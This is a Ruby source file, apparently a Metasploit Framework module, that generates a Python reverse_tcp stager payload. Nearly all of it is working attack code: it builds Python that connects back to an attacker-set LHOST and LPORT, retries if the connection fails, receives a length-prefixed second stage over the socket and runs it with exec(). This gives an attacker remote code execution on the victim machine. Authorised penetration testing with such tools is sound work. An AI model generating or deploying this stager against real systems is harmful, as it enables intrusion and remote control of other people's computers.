# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/python/send_uuid'

module Msf

###
#
# Complex reverse_tcp payload generation for Python
#
###

module Payload::Python::ReverseTcp

  include Msf::Payload::Python
  include Msf::Payload::Python::SendUUID

  def initialize(*args)
    super
    register_advanced_options([
        OptInt.new('StagerRetryCount', [false, 'The number of times the stager should retry if the first connect fails (zero to infinite retries)', 1]),
        OptInt.new('StagerRetryWait', [false, 'Number of seconds to wait for the stager between reconnect attempts'])
      ], self.class)
  end

  #
  # Generate the first stage
  #
  def generate
    conf = {
      port:        datastore['LPORT'],
      host:        datastore['LHOST'],
      retry_count: datastore['StagerRetryCount'],
      retry_wait:  datastore['StagerRetryWait'],
    }

    generate_reverse_tcp(conf)
  end

  #
  # By default, we don't want to send the UUID, but we'll send
  # for certain payloads if requested.
  #
  def include_send_uuid
    false
  end

  def transport_config(opts={})
    transport_config_reverse_tcp(opts)
  end

  def generate_reverse_tcp(opts={})
    # Set up the socket
    cmd  = "import socket,struct#{opts[:retry_wait].to_i > 0 ? ',time' : ''}\n"
    cmd << "counter = 0\n"
    if opts[:retry_wait].blank? # do not retry at all (old style)
      cmd << "s=socket.socket(2,socket.SOCK_STREAM)\n" # socket.AF_INET = 2
      cmd << "s.connect(('#{opts[:host]}',#{opts[:port]}))\n"
    else
      cmd << "while counter<#{opts[:retry_count].to_i}:\n"
      cmd << "\ttry:\n"
      cmd << "\t\ts=socket.socket(2,socket.SOCK_STREAM)\n" # socket.AF_INET = 2
      cmd << "\t\ts.connect(('#{opts[:host]}',#{opts[:port]}))\n"
      cmd << "\t\tbreak\n"
      cmd << "\texcept:\n"
      if opts[:retry_wait].to_i <= 0
        cmd << "\t\tcounter=counter+1\n"
        cmd << "\t\tpass\n" # retry immediately
      else
        cmd << "\t\ttime.sleep(#{opts[:retry_wait]})\n" # retry after waiting
        cmd << "\t\tcounter=counter+1\n"
      end
    end
    cmd << py_send_uuid if include_send_uuid
    cmd << "l=struct.unpack('>I',s.recv(4))[0]\n"
    cmd << "d=s.recv(l)\n"
    cmd << "while len(d)<l:\n"
    cmd << "\td+=s.recv(l-len(d))\n"
    cmd << "exec(d,{'s':s})\n"
            
    py_create_exec_stub(cmd)
  end

  def handle_intermediate_stage(conn, payload)
    conn.put([payload.length].pack("N"))
  end

end

end
